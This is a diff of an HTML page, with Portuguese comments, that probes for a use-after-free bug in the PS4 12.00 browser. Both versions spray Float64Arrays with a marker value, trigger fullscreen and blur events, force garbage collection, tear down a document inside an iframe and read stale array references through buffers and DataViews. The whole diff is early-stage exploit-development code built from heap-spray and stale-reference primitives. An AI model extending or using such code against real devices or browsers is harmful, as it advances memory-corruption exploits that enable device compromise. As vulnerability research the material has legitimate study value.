@@ -1,112 +1,129 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>PS4 FullScreen+Blur Crash - Reentrancy Tests</title>
+<meta charset="UTF-8">
+<title>PS4 Iframe UAF Probe</title>
 </head>
 <body>
 
-<h1>PS4 12.00 - Reentrancy / UAF Investigation</h1>
+<h2>PS4 12.00 - Iframe Post-Teardown Test</h2>
 
-<button onclick="runCrashTest()">Run Test</button>
-<div id="log" style="white-space:pre; font-family:monospace;"></div>
+<button onclick="startTest()">Start Test</button>
+
+<pre id="log" style="background:#111;color:#0f0;padding:10px;height:300px;overflow:auto;"></pre>
 
 <script>
-const PATTERN = 2.121995791e-314;
-
 function log(msg) {
-    const el = document.getElementById("log");
-    el.textContent += msg + "\n";
+    document.getElementById("log").textContent += msg + "\n";
 }
 
-function runCrashTest() {
-    log("Starting... Press OPTIONS");
+let leakedControllers = null;
+let leakedArray = null;
 
-    let controllers = [];
+function startTest() {
+    log("[*] Creating iframe...");
 
-    // PASSO 1 (inalterado)
-    for(let i = 0; i < 5000; i++) {
-        let arr = new Float64Array(8);
-        arr[0] = i;
-        controllers.push(arr);
-    }
+    const iframe = document.createElement("iframe");
+    iframe.style.width = "400px";
+    iframe.style.height = "200px";
+    document.body.appendChild(iframe);
 
-    // PASSO 2 (inalterado)
-    const elem = document.documentElement;
-    if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+    const fWin = iframe.contentWindow;
+    const fDoc = fWin.document;
 
-    // PASSO 3 (inalterado)
-    window.onblur = function() {
-        log("[onblur] triggered");
+    fDoc.open();
+    fDoc.write(`
+        <html>
+        <body>
+        <button onclick="run()">Run Inside Frame</button>
+        <script>
+            const PATTERN = 2.121995791e-314;
+            let controllers = [];
 
-        // =========================
-        // 🔴 TESTE 1 — MICROTASK
-        // =========================
-        Promise.resolve().then(() => {
-            try {
-                log("[Microtask] controllers[0][0] = " + controllers[0][0]);
-            } catch(e) {
-                log("[Microtask ERROR] " + e);
+            for (let i = 0; i < 5000; i++) {
+                let arr = new Float64Array(8);
+                arr[0] = i;
+                controllers.push(arr);
             }
-        });
 
-        // =========================
-        // 🔴 TESTE 2 — RAF (reentrancy)
-        // =========================
-        requestAnimationFrame(() => {
+            window.run = function() {
+                document.documentElement.webkitRequestFullscreen?.();
+
+                window.onblur = function() {
+
+                    // 🔥 GC AGRESSIVO (o que deu mais crash)
+                    controllers = null;
+                    for (let i = 0; i < 20000; i++) {
+                        new ArrayBuffer(0x10000);
+                    }
+
+                    // expor tentativa de leak (se ainda existir)
+                    try {
+                        parent.postMessage({
+                            type: "LEAK",
+                            controllers: controllers
+                        }, "*");
+                    } catch(e) {}
+
+                    // teardown crítico
+                    setTimeout(() => {
+                        document.open();
+                        document.write("<h1>Teardown</h1>");
+                        document.close();
+                    }, 1000);
+                };
+            };
+        <\/script>
+        </body>
+        </html>
+    `);
+    fDoc.close();
+
+    // =========================
+    // RECEBER REFERÊNCIA (se possível)
+    // =========================
+    window.addEventListener("message", (e) => {
+        if (e.data && e.data.type === "LEAK") {
+            leakedControllers = e.data.controllers;
+
             try {
-                log("[RAF] controllers[0][0] = " + controllers[0][0]);
-            } catch(e) {
-                log("[RAF ERROR] " + e);
+                leakedArray = leakedControllers ? leakedControllers[0] : null;
+                log("[+] Leak recebido");
+            } catch (err) {
+                log("[!] Erro ao salvar leak: " + err);
             }
-        });
+        }
+    });
 
-        // =========================
-        // 🔴 TESTE 3 — BUFFER ACCESS
-        // =========================
-        requestAnimationFrame(() => {
-            try {
-                let buf = controllers[0].buffer;
-                log("[BUFFER] byteLength = " + buf.byteLength);
-            } catch(e) {
-                log("[BUFFER ERROR] " + e);
-            }
-        });
+    // =========================
+    // TESTES PÓS-TEARDOWN
+    // =========================
+    setTimeout(() => {
+        log("[*] Running post-teardown tests...");
 
-        // =========================
-        // 🔴 TESTE 4 — DATAVIEW (low-level)
-        // =========================
-        requestAnimationFrame(() => {
-            try {
-                let dv = new DataView(controllers[0].buffer);
-                let val = dv.getUint32(0, true);
-                log("[DATAVIEW] value = " + val);
-            } catch(e) {
-                log("[DATAVIEW ERROR] " + e);
-            }
-        });
-
-        // =========================
-        // PASSO 4 (spray mantido)
-        // =========================
-        let spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let p = new Float64Array(10);
-            p.fill(PATTERN);
-            spray.push(p);
+        try {
+            log("[TEST A] Array access:");
+            log(leakedArray ? leakedArray[0] : "null");
+        } catch(e) {
+            log("[TEST A ERROR] " + e);
         }
 
-        // =========================
-        // PASSO FINAL (CRÍTICO - NÃO ALTERADO)
-        // =========================
-        setTimeout(() => {
-            document.open();
-            document.write('<html><body><h1>Crash</h1></body></html>');
-            document.close();
+        try {
+            log("[TEST B] Buffer:");
+            log(leakedArray ? leakedArray.buffer.byteLength : "null");
+        } catch(e) {
+            log("[TEST B ERROR] " + e);
+        }
 
-            setTimeout(() => location.reload(), 500);
-        }, 3000);
-    };
+        try {
+            log("[TEST C] DataView:");
+            let dv = new DataView(leakedArray.buffer);
+            log(dv.getUint32(0, true));
+        } catch(e) {
+            log("[TEST C ERROR] " + e);
+        }
+
+    }, 4000);
 }
 </script>
 
